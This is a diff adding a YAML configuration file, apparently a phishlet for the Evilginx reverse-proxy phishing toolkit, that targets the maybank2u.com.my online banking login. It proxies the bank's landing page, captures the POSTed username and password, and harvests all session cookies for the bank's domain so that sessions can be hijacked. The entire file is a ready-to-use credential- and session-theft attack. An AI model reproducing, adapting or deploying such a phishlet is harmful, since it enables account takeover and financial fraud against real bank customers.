@@ -1,0 +1,21 @@
+author: '@appeton666'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'maybank2u.com.my', session: true, is_landing: true}
+sub_filters:
+  - {triggers_on: 'www.maybank2u.com.my', orig_sub: 'www', domain: 'maybank2u.com.my', search: 'https://www.maybank2u.com.my/', replace: 'https://www.maybank2u.com.my/', mimes: ['text/html', 'application/json']}
+auth_tokens:
+  - domain: '.maybank2u.com.my'
+    keys: ['_fbp', '_ga', 'incap_ses_1139_2497266', 'nlbi_2497266', 'visid_incap_2497266','.*,regexp']
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'https://www.maybank2u.com.my'
+  path: '/web/ssov1/login/home/m2u/common/login.do'
